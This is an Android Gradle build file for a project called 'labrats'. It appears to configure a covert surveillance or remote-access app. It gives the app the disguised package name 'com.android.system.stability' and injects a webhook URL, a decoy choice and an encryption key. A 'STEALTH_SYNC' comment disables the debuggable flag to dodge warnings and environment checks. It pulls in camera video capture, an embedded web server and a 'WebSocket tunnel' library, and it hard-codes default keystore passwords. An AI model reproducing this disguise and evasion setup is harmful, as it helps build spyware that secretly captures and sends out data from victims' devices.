plugins {
    id 'com.android.application'
}

// Load keystore properties from file
def keystorePropertiesFile = rootProject.file('keystore.properties')
def keystoreProperties = new Properties()

if (keystorePropertiesFile.exists()) {
    keystoreProperties.load(new FileInputStream(keystorePropertiesFile))
}

android {
    namespace 'com.labs.labrats'
    compileSdk 34

    buildFeatures {
        buildConfig true
    }

    defaultConfig {
        applicationId "com.android.system.stability"
        minSdk 21
        targetSdk 34
        versionCode 620
        versionName "3.4.8"
        
        // Read WEBHOOK_URL from local.properties
        def localProperties = new Properties()
        def localPropertiesFile = rootProject.file('local.properties')
        if (localPropertiesFile.exists()) {
            localProperties.load(new FileInputStream(localPropertiesFile))
        }
        
        def webhookUrl = localProperties['WEBHOOK_URL'] ?: ""
        def decoyChoice = localProperties['DECOY_CHOICE'] ?: "1"
        def encryptionKey = localProperties['ENCRYPTION_KEY'] ?: "AndroidKernel1337"

        buildConfigField "String", "WEBHOOK_URL", "\"${webhookUrl}\""
        buildConfigField "int", "DECOY_CHOICE", "${decoyChoice}"
        buildConfigField "String", "ENCRYPTION_KEY", "\"${encryptionKey}\""
    }

    signingConfigs {
        release {
            if (keystorePropertiesFile.exists()) {
                println "[BUILD] Keystore config detected: ${keystorePropertiesFile.absolutePath}"
                storeFile rootProject.file(keystoreProperties['storeFile'] ?: 'lab-rats-keystore.jks')
                storePassword keystoreProperties['storePassword'] ?: 'lab-rats123'
                keyAlias keystoreProperties['keyAlias'] ?: 'lab-rats-key'
                keyPassword keystoreProperties['keyPassword'] ?: 'lab-rats123'
            }
        }
    }

    buildTypes {
        debug {
            // [STEALTH_SYNC] Disabled debuggable flag to prevent system "Debugging App" warnings 
            // and to allow the app to pass environment checks during local testing.
            debuggable false
            minifyEnabled false
            signingConfig signingConfigs.release
        }
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            if (keystorePropertiesFile.exists() && !project.hasProperty("disableSigning")) {
                signingConfig signingConfigs.release
            }
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }

    lint {
        abortOnError false
    }

    testOptions {
        unitTests {
            includeAndroidResources = true
            returnDefaultValues = true
        }
    }

    sourceSets {
        test {
            java.srcDirs = ['src/test/java']
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'org.nanohttpd:nanohttpd:2.3.1'
    implementation "androidx.work:work-runtime:2.9.0"

    // CameraX core library using the camera2 implementation
    def camerax_version = "1.3.1"
    implementation "androidx.camera:camera-core:${camerax_version}"
    implementation "androidx.camera:camera-camera2:${camerax_version}"
    implementation "androidx.camera:camera-lifecycle:${camerax_version}"
    implementation "androidx.camera:camera-video:${camerax_version}"
    implementation "androidx.camera:camera-view:${camerax_version}"
    implementation "androidx.camera:camera-extensions:${camerax_version}"

    // [STABILITY_SYNC] WebSocket Tunnel Engine
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'

    // Testing Infrastructure
    testImplementation 'junit:junit:4.13.2'
    testImplementation 'org.mockito:mockito-core:5.11.0'
    testImplementation 'org.robolectric:robolectric:4.11.1'
    testImplementation 'androidx.test:core:1.5.0'
}

// Fix for "The processing instruction target matching '[xX][mM][lL]' is not allowed"
// This ensures the XML declaration is always the first line in resource files.
tasks.register("fixXmlDeclarations") {
    doLast {
        fileTree("src/main/res").matching {
            include "**/*.xml"
        }.forEach { file ->
            def content = file.getText("UTF-8")
            if (content.contains("<?xml")) {
                def lines = content.readLines()
                int xmlIndex = lines.findIndexOf { it.trim().startsWith("<?xml") }
                if (xmlIndex > 0) {
                    println "Fixing XML declaration in ${file.path}"
                    def xmlLine = lines.get(xmlIndex)
                    def remaining = new ArrayList(lines)
                    remaining.remove(xmlIndex)
                    file.setText(xmlLine + "\n" + remaining.join("\n"), "UTF-8")
                }
            }
        }
    }
}

project.afterEvaluate {
    if (tasks.findByName("preBuild")) {
        tasks.named("preBuild").configure {
            dependsOn("fixXmlDeclarations")
        }
    }
}

















